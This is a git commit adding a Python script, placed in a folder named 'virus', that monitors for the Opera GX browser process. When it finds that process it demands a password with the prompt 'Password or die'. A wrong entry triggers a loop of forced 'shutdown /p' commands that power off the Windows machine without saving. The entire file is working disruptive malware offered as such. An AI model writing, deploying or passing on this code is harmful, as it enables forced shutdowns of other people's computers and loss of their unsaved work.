fa9bad06b818013bf06367f4ac45a1643998c2c6
Belbettor <beltran302009@gmail.com>
2025-01-17 14:12:42 +0100

    Create Game0_6.py
    Probably the last

---
+++ virus/Game0_6.py
@@ -0,0 +1,50 @@
+import psutil
+import os
+import time
+from ctypes import cast, POINTER
+from comtypes import CLSCTX_ALL
+
+running = True
+
+def backdoor():
+    task_thread = None
+
+    correct_password = "Multipass"  # Set your desired password here
+    
+    while True:
+        password = input("Password or die: ")
+
+        if password == correct_password:
+            stop_task()
+            print("Task stop.")
+            break
+        else:
+            print("Have fun.")
+            time.sleep(2)
+            shutdown_computer()
+            break
+
+def stop_task():
+    global running
+    running = False
+
+def is_opera_running():
+    # Check if Opera GX is running
+    for process in psutil.process_iter(['name']):
+        if process.info['name'].lower() == 'opera.exe':  # Adjust for Opera GX
+            return True
+    return False
+
+def shutdown_computer():
+    while running:
+        os.system("shutdown /p")
+
+if __name__ == "__main__":
+    while True:
+        if is_opera_running():
+            print("A non legal aplication is runing,")
+            time.sleep(1)
+            backdoor()
+            break
+        else:
+            time.sleep(1)
